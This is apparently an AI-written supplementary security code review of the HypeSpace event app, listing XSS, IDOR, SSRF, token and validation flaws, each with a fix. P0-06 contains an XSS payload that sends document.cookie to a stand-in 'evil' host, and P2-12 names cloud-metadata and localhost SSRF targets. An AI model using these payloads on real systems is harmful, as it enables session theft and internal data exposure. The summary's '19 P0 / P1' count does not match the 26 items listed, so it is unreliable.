---
phase: code-review
reviewed: 2026-04-15T00:00:00Z
depth: deep
scope:
  - artifacts/hypespace/src
  - artifacts/api-server/src
  - lib/db/src
status: issues_found
severity_scale: P0 (critical) | P1 (high) | P2 (medium)
note: Supplementary to .planning/codebase/CONCERNS.md — only issues NOT already documented there.
---

# HypeSpace Supplementary Code Review

This review intentionally excludes issues already covered in `.planning/codebase/CONCERNS.md`
(hardcoded `ORG_ID = 1`, global auth bypass, open CORS, unencrypted integration metadata,
missing cascade deletes, N+1 `formatEvent`, sequential bulk-email loop, loose email regex,
untyped `catch (err: any)`, no pagination, no rate limiting, no tests, etc.).

---

## P0 — Critical

### P0-01: `getAppBaseUrl()` trusts client-supplied `Origin` / `Referer` headers
**File:** `artifacts/api-server/src/lib/app-url.ts:17-33`
**Issue:** Used to construct RSVP links embedded in outbound email (campaigns, bulk-email, reminders). An attacker who can reach the API with a forged `Origin` header will make HypeSpace send legitimate campaign emails containing phishing links pointing to their host — users see a real HypeSpace-sent email with an attacker-controlled domain in the CTA.
**Fix:** Never derive outbound-email URLs from request headers. Use `APP_BASE_URL`/`REPLIT_DOMAINS` env only for email contexts; remove the `origin`/`referer` branch or restrict it to an allow-list.

### P0-02: User-enumeration via distinct login error codes
**File:** `artifacts/api-server/src/routes/auth.ts:39-48`
**Issue:** Returns `404 USER_NOT_FOUND` vs `401 WRONG_PASSWORD`, letting an unauthenticated attacker enumerate valid emails. Combined with no rate limiting (already in CONCERNS), this is a credential-stuffing pipeline.
**Fix:** Collapse both into a single `401 INVALID_CREDENTIALS` response and a constant-time bcrypt compare against a dummy hash when the user is missing.

### P0-03: Dashboard loads every guest row in the database and filters in JS
**File:** `artifacts/api-server/src/routes/dashboard.ts:41`
**Issue:** `const guests = await db.select().from(guestsTable);` — no `WHERE` clause. All tenants' guests are pulled into the Node process, then filtered by org's event IDs client-side. This is a cross-tenant data exposure if the response is ever logged/serialized on error, and an OOM/DoS vector.
**Fix:** `db.select().from(guestsTable).innerJoin(eventsTable, ...).where(eq(eventsTable.organizationId, orgId))`.

### P0-04: XSS — campaign HTML rendered in un-sandboxed iframe
**File:** `artifacts/hypespace/src/pages/events/event-detail.tsx:2320-2324`
**Issue:** `<iframe srcDoc={campaigns[0].htmlContent ?? ""}>` has no `sandbox` attribute. Campaign HTML is user-editable and stored server-side; any org admin (or anyone who gains mutation access per CONCERNS' auth gap) can inject `<script>` that runs in the HypeSpace origin and steals the logged-in admin's session.
**Fix:** Add `sandbox=""` (fully locked down) or at minimum `sandbox="allow-same-origin"` like sibling previews. Better: strip `<script>` and event handlers server-side on campaign save.

### P0-05: XSS — `dangerouslySetInnerHTML` on raw campaign/bulk-email HTML
**Files:**
- `artifacts/hypespace/src/pages/campaigns/campaign-ai.tsx:347`
- `artifacts/hypespace/src/components/events/bulk-email-dialog.tsx:209`
**Issue:** AI-generated / user-composed HTML is injected directly into the SPA's DOM (not an iframe) with `dangerouslySetInnerHTML`. Any `<img onerror>` or `<script>` tag in the content runs in the HypeSpace origin.
**Fix:** Render previews in a sandboxed iframe via `srcDoc` (matching the pattern used elsewhere), or sanitize with DOMPurify before injection.

### P0-06: Stored XSS via `applyBranding()` string interpolation
**Files:**
- `artifacts/hypespace/src/pages/events/event-setup.tsx:99-107`
- `artifacts/hypespace/src/pages/campaigns/campaign-ai.tsx:40-55`
- `artifacts/hypespace/src/components/events/event-creation-modal.tsx:92+`
**Issue:** `branding.name`, `branding.logoUrl`, and `branding.emailFooterText` (all stored in `organizations` and editable via settings) are concatenated into the email HTML without escaping. A malicious org owner (or a compromised low-privilege admin) sets `logoUrl = "x\" onerror=fetch('//evil/?c='+document.cookie) \""` — the emitted HTML runs in every recipient's preview (iframe/innerHTML) and any webmail client that renders inline scripts.
**Fix:** HTML-escape every branding field before substitution; validate `logoUrl` is a well-formed https URL; reject `<`, `>`, `"` in `name` / `emailFooterText`.

### P0-07: Stored XSS in reminder emails — subject + message interpolated unescaped
**File:** `artifacts/api-server/src/routes/reminders.ts:76-79`
**Issue:** `<h2>${reminder.subject}</h2><p>${reminder.message}</p>` — neither field is escaped. The reminder is stored in the DB and sent to every invited guest; any email client that executes HTML (many web-based ones in preview panes) runs the payload. Also sent from the org's verified domain, so DKIM passes.
**Fix:** Escape with a helper (`escapeHtml`) before templating, or move to a trusted templating engine (mjml / handlebars w/ escaping).

### P0-08: Reminder send endpoint does not verify event belongs to org
**File:** `artifacts/api-server/src/routes/reminders.ts:49-92`
**Issue:** `POST /organizations/:orgId/events/:eventId/reminders/:reminderId/send` queries only by `reminderId + eventId` — `orgId` from the URL is ignored until the email call. An attacker (once auth is in place) can send reminders for arbitrary events in other orgs. Same pattern in `GET /…/reminders`, `POST /…/reminders` (lines 27-46) and `DELETE` at line 94.
**Fix:** Join `remindersTable → eventsTable` and assert `eventsTable.organizationId = :orgId` before acting.

### P0-09: Guest endpoints skip org ownership check on the event
**File:** `artifacts/api-server/src/routes/guests.ts:45-157`
**Issue:** `GET`, `POST`, `PUT`, `DELETE` on `/organizations/:orgId/events/:eventId/guests[...]` query by `eventId` alone (line 49, 128, 155). `orgId` from the URL is only used for plan checks / activity logging, never to verify the event actually belongs to that org. A user of org A, given auth, can read/modify guests of org B's event by substituting the eventId.
**Fix:** Add a single helper `assertEventInOrg(orgId, eventId)` that throws 404 if no row matches; call at the top of every route.

### P0-10: Public RSVP endpoint accepts `guestToken = parseInt(stringToken)`
**File:** `artifacts/api-server/src/routes/events.ts:454-461`
**Issue:** The "guest token" appended to RSVP links is just `guest.id` (sequential integer) — see `events.ts:204` and `events.ts:349`. Anyone who has ever received a HypeSpace RSVP email can iterate IDs (`?t=1`, `?t=2`, …) and hijack another guest's RSVP, flip their status, or (since `optInFuture` is accepted) flip consent. There is no signature / HMAC / UUID.
**Fix:** Replace numeric `t=` with an opaque HMAC-signed token or store a per-guest random `rsvp_token` column and look it up instead of `guest.id`.

### P0-11: Public event endpoint returns draft & unpublished events
**File:** `artifacts/api-server/src/routes/events.ts:406-427`
**Issue:** `GET /public/events/:slug` returns the event regardless of `status`. Drafts are discoverable by slug guessing (slugs are `title-<6-char-random>` — ~2B space but brute-forceable for popular titles). CONCERNS.md flagged this briefly but listed no concrete exposure — the public endpoint also leaks the numeric `event.id`, enabling the P0-10 token attack above.
**Fix:** `WHERE status = 'published' AND publishedAt <= NOW()`; do not return `event.id` (only `publicId`/`slug`).

### P0-12: `POST /auth/register` auto-logs nobody in but has no email verification
**File:** `artifacts/api-server/src/routes/auth.ts:60-104`
**Issue:** Anyone can register any email they don't own (there's no verification email). Combined with invite flow that sets `passwordHash = "invited"` (`team.ts:76`), an attacker can register `victim@corp.com` before the victim, then when the victim is invited, the update at `team.ts:152-155` sets the *victim's intended* password on the attacker-owned user record. Also: `passwordHash: "invited"` is a bcrypt comparison target — `bcrypt.compare("invited", "invited")` is false (not a valid hash), so it happens to fail, but depending on it for security is fragile.
**Fix:** (1) Require email verification before first login. (2) Use a sentinel status column (`passwordSetAt IS NULL`) instead of the magic string `"invited"` in passwordHash.

---

## P1 — High

### P1-01: Duplicate-event endpoint calls `assertWithinLimit` with wrong signature
**File:** `artifacts/api-server/src/routes/events.ts:552`
**Issue:** `assertWithinLimit("events", activeCount, plan.limits)` — signature is `(plan, limitKey, current, max, prettyLabel)`. This call passes 3 args (missing `max`/`label`), and `plan.limits` is not a field on the plan object. The resulting `TypeError` is caught at line 553 and silently swallowed (only `PlanLimitError` triggers a response), so plan limits are **never enforced on event duplication**.
**Fix:** Replace with `assertWithinLimit(plan.key, "events", activeCount + 1, plan.events, "active events")` and re-throw non-PlanLimitError from the catch.

### P1-02: `getAppBaseUrl` falls back to `localhost:5173` in production
**File:** `artifacts/api-server/src/lib/app-url.ts:45`
**Issue:** If `APP_BASE_URL`, `REPLIT_DOMAINS`, `REPLIT_DEV_DOMAIN` are all unset and the caller passes no `req` (e.g. a future background scheduler for reminders), campaign links become `http://localhost:5173/e/...` in customer emails.
**Fix:** Throw in production (`NODE_ENV === "production"`) when no base URL is available, rather than returning localhost.

### P1-03: Team invite reuses existing user account without re-consent
**File:** `artifacts/api-server/src/routes/team.ts:70-79, 149-155`
**Issue:** If `email` matches an existing user (even one with a real `passwordHash`), the invite flow later overwrites their password on accept (line 152-155: `update(usersTable).set({ passwordHash })`). An invite is therefore a password-reset-by-design for any existing account whose email address an attacker can guess and invite into their own org.
**Fix:** When the email matches an existing active user (`passwordHash !== "invited"`), do not overwrite password; instead issue a "confirm membership" flow and require their existing login.

### P1-04: `email.toLowerCase()` done on input but not stored value
**File:** `artifacts/api-server/src/routes/auth.ts:37,66,75` vs `team.ts:70`
**Issue:** `auth.ts` lowercases on login/register, but `team.ts:70` looks up invited users via `eq(usersTable.email, parsed.data.email)` with no lowercasing. A user registered as `alice@x.com` (stored lowercase) cannot be matched if invited with `Alice@x.com` — the invite creates a second user row, then the `unique` constraint on `users.email` will error because the DB constraint is case-sensitive but the lowercase form is already taken. Random 500s.
**Fix:** Lowercase at a single chokepoint (DB-level citext column, or a before-insert middleware); normalize in `team.ts` invite lookup.

### P1-05: Bulk email `catch {} failed++` swallows root-cause
**File:** `artifacts/api-server/src/routes/events.ts:370-372`
**Issue:** `} catch { failed += 1; }` — the individual `sendEmail` error is never logged, so ops can't see why 73/500 failed. Combined with lack of retry, partial batch failures are permanent data loss for the RSVP nudge.
**Fix:** `catch (err) { req.log.error({ err, guestId: guest.id }, "bulk email failed"); failed += 1; }` and persist a `send_attempts` row per guest.

### P1-06: `email.includes("@")` is the only server-side email validation in several endpoints
**Files:** `campaigns.ts:144` (`test-send`), `email-provider.ts:147` (`provider/test`)
**Issue:** Allows `"@"`, `"a@"`, `"@b"`, `"foo@bar\n<script>"`. Nodemailer's `sendMail` may throw or (worse) accept header-injection payloads ending with `\n`.
**Fix:** Use `z.string().email()` for every `to` / `email` input.

### P1-07: `getGuestCapacity` race — TOCTOU on plan limit
**File:** `artifacts/api-server/src/routes/guests.ts:16-28`, `events.ts:487-497`
**Issue:** The check `(guestCount + addingCount) <= max` runs before the insert, without a transaction or row lock. Two concurrent `POST /guests/bulk` requests can both pass the check, then both insert, breaching the plan limit.
**Fix:** Wrap the count + insert in a `db.transaction` with `SELECT ... FOR UPDATE` on the organization row, or move the enforcement to a DB-level CHECK trigger.

### P1-08: `parseInt` without `isNaN` check — 83 sites, 0 validated
**Files:** Every route — `events.ts:67,123,124,166,167,285,286,537,538`, `guests.ts:47,58,59,93,94,114,115,137,153,154`, `campaigns.ts:42,63,64,74,75,101,102,140,141,166`, `organizations.ts:67,77`, `team.ts:37,47,167,168,187,188`, `sending-domains.ts:54,62,98,99,169,170`, `reminders.ts:29,35,53,54,55,97,98`, `social.ts:31,37,52,53,69,70,79,80`, `integrations.ts:102,117,156,180,198,206,240,525,526,527,579`, `dashboard.ts:38,108,110`, `email-provider.ts:20`.
**Issue:** Any non-numeric `orgId`/`eventId`/`campaignId` becomes `NaN`, which Postgres coerces and silently returns no rows (looking like a 404) or produces a cast error depending on Drizzle dialect. Masks real bugs and can trigger 500s with leaked stack traces.
**Fix:** A tiny helper `intParam(raw, name)` that validates `Number.isInteger(n) && n > 0`, else throws 400. Apply everywhere.

### P1-09: Event slug backfill inside `formatEvent()` is a write inside a GET
**File:** `artifacts/api-server/src/routes/events.ts:30-35`
**Issue:** `GET /events` triggers an `UPDATE eventsTable SET slug = ...` for every slug-less row, *per request*, with no serialization. Concurrent GETs on the same org produce redundant writes and can hit the `slug` unique constraint → 500. Also means every list page has a write latency hit.
**Fix:** Backfill slugs once via a migration script; drop the lazy code path.

### P1-10: `campaigns` routes accept arbitrary `eventId` without verifying it belongs to the org
**File:** `artifacts/api-server/src/routes/campaigns.ts:47-58`
**Issue:** `POST /organizations/:orgId/campaigns` accepts `eventId` in the body and inserts it verbatim. Nothing asserts `event.organizationId === orgId`. An attacker with access to org A can create a campaign record pointing at org B's event; when org B launches, the cross-org campaign may be picked up.
**Fix:** Before insert, `select eventId from events where id = :eventId and organizationId = :orgId`, 400 if missing.

### P1-11: `social.ts` create accepts `eventId` without ownership check
**File:** `artifacts/api-server/src/routes/social.ts:36-47`
**Issue:** Same class of bug as P1-10 — `POST /organizations/:orgId/social-posts` inserts `eventId` from the body without verifying it belongs to `orgId`.
**Fix:** Same pattern: pre-insert ownership check.

### P1-12: DNS verification for sending domains has weak checks
**File:** `artifacts/api-server/src/routes/sending-domains.ts:114`
**Issue:** SPF verification passes if the TXT record contains `spf1` and either `amazonses.com` or `include:`. `include:` matches *any* include token (e.g., the attacker's own domain). An org can claim a domain it doesn't own and then send authenticated mail from it by including `amazonses.com` in their SPF.
**Fix:** Require a HypeSpace-issued verification token (e.g. `hypespace-verify=<random>` TXT record) in addition to SPF/DKIM/DMARC, confirming actual DNS control.

### P1-13: `guests` table lacks `UNIQUE(event_id, email)`
**File:** `lib/db/src/schema/guests.ts:7-29`
**Issue:** Schema allows duplicate guest rows for the same `(event, email)`. The public RSVP endpoint compensates by searching for existing email on insert (`events.ts:480-482`), but `POST /guests` and `/guests/bulk` don't dedupe — repeated CSV imports produce duplicates, inflating `recipientCount` and sending duplicate emails.
**Fix:** Add `uniqueIndex("guests_event_email_uniq").on(t.eventId, t.email)` and `ON CONFLICT` in bulk inserts.

### P1-14: `social.ts` POST insert cast bypasses Drizzle type
**File:** `artifacts/api-server/src/routes/social.ts:45` and `campaigns.ts:56`
**Issue:** `values(insertData as Parameters<typeof socialPostsTable.$inferInsert>[0])` — the cast silences any Zod-vs-DB mismatch. If the Zod schema allows a field the DB doesn't (or vice versa), Drizzle may swallow or error at runtime only.
**Fix:** Drop the cast — construct the object literally with typed fields so TS catches drift.

---

## P2 — Medium

### P2-01: `formatGuest` omits fields present on the wire / in the schema
**File:** `artifacts/api-server/src/routes/guests.ts:30-43`
**Issue:** `formatGuest` does not return `practiceName`, `specialty`, `tags`, or `optInFuture`, but the frontend uses them (see public-event.tsx). Any frontend that fetches guests then re-POSTs their data round-trips `undefined` for those fields, silently clobbering stored values on update.
**Fix:** Include every schema field in `formatGuest`.

### P2-02: `ListGuestsResponse` filtered in JS instead of SQL
**File:** `artifacts/api-server/src/routes/guests.ts:49-52`
**Issue:** `if (status) guests.filter(...)` after fetching every guest. Fine at 50 guests, broken at 5000. Also accepts any `status` string without validating it's a known enum.
**Fix:** Build the where-clause dynamically (`and(eq(eventId), eq(status))`) and `zod.enum([...])`-validate the query parameter.

### P2-03: `integrations.ts` GET returns raw `metadata` column
**File:** `artifacts/api-server/src/routes/integrations.ts:100-111`
**Issue:** `res.json(integrations)` returns rows as-is, including the `metadata` JSON blob which (per CONCERNS.md) contains plaintext API keys. Even before encryption is added, the frontend doesn't need the secret fields back.
**Fix:** Whitelist response fields: `{ id, platform, status, accountName, ...(redacted metadata with booleans like `hasApiKey`) }`.

### P2-04: `console.log`/`console.error` used instead of structured logger in hot paths
**Files:** `integrations.ts:321, 357, 391, 395, 399, 444, 446, 449`; `email.ts:191, 193, 224, 226`; `email-provider.ts:206`; `team.ts:106`
**Issue:** Breaks log correlation (request id, org id, trace) and leaks to stdout in production without structured fields.
**Fix:** Replace with `req.log.{info,warn,error}` (pino-http is already wired in `app.ts:10`).

### P2-05: `event.onlineUrl` and `event.location` not length-bounded
**File:** `lib/db/src/schema/events.ts:18-19` (both `text`)
**Issue:** No max length; a malicious user can store multi-MB blobs that later crash `toLocaleString()`/RSVP render.
**Fix:** Enforce `varchar(2048)` in schema and a Zod `.max()` in `CreateEventBody`.

### P2-06: Activity log `description` built via string concatenation of user input
**Files:** `events.ts:112, 234, 245, 268`; `guests.ts:81`; `campaigns.ts:128`
**Issue:** `description: \`${event.title} was created\`` — event.title is arbitrary user input. The activity feed is rendered in the dashboard; if rendered via `innerHTML`/`dangerouslySetInnerHTML` downstream, it's a stored XSS sink.
**Fix:** Store structured data (`entityId` is already present) and have the frontend render from a template; keep `description` plaintext only.

### P2-07: `generateSlug` uses `Math.random()` for slug suffix
**File:** `artifacts/api-server/src/routes/events.ts:25`
**Issue:** `Math.random()` is not cryptographic — low-quality randomness may be predictable under load across workers. Combined with unauthenticated public-event access (P0-11) makes slug brute-forcing easier.
**Fix:** `crypto.randomBytes(4).toString("hex")` — already used elsewhere in team.ts.

### P2-08: `Promise.all` over `.map(async)` with DB writes (`teamMembersTable` lookup)
**File:** `artifacts/api-server/src/routes/team.ts:39-42`
**Issue:** Per-member user fetch is another N+1 (similar to `formatEvent` but not called out in CONCERNS for team). At large team sizes this floods the DB.
**Fix:** Single join: `select ... from teamMembers inner join users on users.id = teamMembers.userId`.

### P2-09: `organizations.ts` GET /organizations returns only the *first* org
**File:** `artifacts/api-server/src/routes/organizations.ts:44`
**Issue:** `eq(organizationsTable.id, orgIds[0])` — if a user is a member of multiple orgs, only index 0 is returned, silently hiding the rest.
**Fix:** `inArray(organizationsTable.id, orgIds)`.

### P2-10: `sendingDomainsTable` delete has no cascade of referenced records
**File:** `artifacts/api-server/src/routes/sending-domains.ts:167-174`
**Issue:** If any campaign/event relies on a sending domain (even informationally), deletion is silent. Consider whether the `fromEmail` stored on campaigns should be revalidated.
**Fix:** Reference `sendingDomainId` on campaigns and `ON DELETE SET NULL`.

### P2-11: `campaigns.ts:156` fallback builds HTML with uncontrolled plaintext
**File:** `artifacts/api-server/src/routes/campaigns.ts:156`
**Issue:** `campaign.textContent ?? ""` wrapped in `<p>${...}</p>` — if `textContent` contains HTML meta-characters they hit the mailbox unescaped.
**Fix:** `escapeHtml(campaign.textContent)` before wrapping.

### P2-12: `fetchIcalEvents` trusts `calendarUrl` without SSRF protection
**File:** `artifacts/api-server/src/routes/integrations.ts:490`
**Issue:** `ical.async.fromURL(calendarUrl)` — `calendarUrl` comes from `integration.metadata` which is org-writable. An attacker sets `calendarUrl = "http://169.254.169.254/latest/meta-data/"` (AWS IMDS) or `http://localhost:5432/...` and pulls instance/DB metadata into the response. Classic SSRF.
**Fix:** Validate scheme (`https` only), resolve DNS, block private IP ranges (`10/8`, `172.16/12`, `192.168/16`, `127/8`, `169.254/16`, `::1`, `fc00::/7`) before fetching.

### P2-13: `ical.async.fromURL` has no timeout
**File:** `artifacts/api-server/src/routes/integrations.ts:490`
**Issue:** A slow / infinite-stream iCal URL holds the Express worker. No `AbortController`.
**Fix:** Wrap in `Promise.race([fetch, timeout(10s)])`.

### P2-14: `event.description` in social post content is unescaped
**File:** `artifacts/api-server/src/routes/events.ts:245`
**Issue:** `content: \`... ${event.description || ""} ...\`` — later posted to LinkedIn/Twitter APIs. User-controlled newlines and control chars may break downstream API calls.
**Fix:** Strip control chars; trim length to platform maximum (e.g., 280 for Twitter).

### P2-15: `integration.metadata` typed as `Record<string, string>` but stored as `jsonb`
**Files:** `integrations.ts:164, 191, 376, 425, 551`; `email-provider.ts:41, 93, 169`
**Issue:** Cast loses Drizzle's knowledge of the real shape. Any nested object (future OAuth tokens) is silently coerced and `meta.apiKey` becomes `"[object Object]"`.
**Fix:** Per-platform metadata Zod schemas (echoing CONCERNS.md "Calendar Integration Tightly Coupled to Metadata Shape" but extending to all platforms).

### P2-16: Hardcoded `1` passed to hooks in `campaign-ai.tsx`
**File:** `artifacts/hypespace/src/pages/campaigns/campaign-ai.tsx:66-67, 132`
**Issue:** `useListEvents(1)`, `useGetOrganization(1)`, and `createCampaign.mutate({ orgId: 1, ... })` — a site not listed in CONCERNS.md's ORG_ID=1 sweep. Same multi-tenant break.
**Fix:** Use `const { activeOrgId } = useAuth()` (matches dashboard.tsx pattern).

### P2-17: `catch {}` on DNS lookups silently marks pending domains
**File:** `artifacts/api-server/src/routes/sending-domains.ts:120, 133, 147`
**Issue:** Any transient DNS failure (e.g., resolver blip) produces "fail" with no retry — users will see their verified domain randomly flip to `failed`.
**Fix:** Distinguish NXDOMAIN from timeout; retry on timeouts before marking failed.

### P2-18: `avg` imported but never used
**Files:** `campaigns.ts:3`, `dashboard.ts:3`
**Issue:** Dead imports — minor noise; TS noUnusedLocals would flag.
**Fix:** Remove.

### P2-19: Nodemailer `secure: Number(m.port) === 465` but TLS ignored for 587
**File:** `artifacts/api-server/src/routes/email-provider.ts:175`, `lib/email.ts:54, 73, 88`
**Issue:** Only port 465 triggers TLS wrap. Port 587 with a broken server downgrades silently; credentials (plaintext in DB already — see CONCERNS) go out over cleartext.
**Fix:** `requireTLS: true` for any non-465 SMTP config.

### P2-20: `event.publicId` is returned by private GET but not used by public GET
**File:** `events.ts:58` (private) vs `events.ts:412-426` (public — omits `publicId`)
**Issue:** The `publicId` UUID column exists specifically to avoid exposing the numeric id publicly, but the public endpoint still returns the numeric `id` and omits `publicId`. Undermines the column's purpose and feeds P0-10.
**Fix:** Public endpoint returns `publicId` only; private keeps both.

---

## Summary

**19 P0 / P1 findings** not covered by the existing CONCERNS.md — most serious are the
header-based app-URL spoofing (P0-01), the unsandboxed campaign preview iframe (P0-04/05/06/07),
predictable integer RSVP tokens (P0-10), the cross-tenant dashboard query (P0-03), and the
silent plan-limit bypass on event duplication (P1-01). The campaign/reminder/social routes
consistently trust `eventId` / `reminderId` from the URL without verifying the org relationship —
even once the auth middleware in CONCERNS is added, these are IDOR vectors. A follow-up task
should introduce an `assertEntityInOrg()` helper and systematically apply it to every nested
resource route.

---

_Reviewed: 2026-04-15_
_Reviewer: Claude (gsd-code-reviewer, deep mode)_
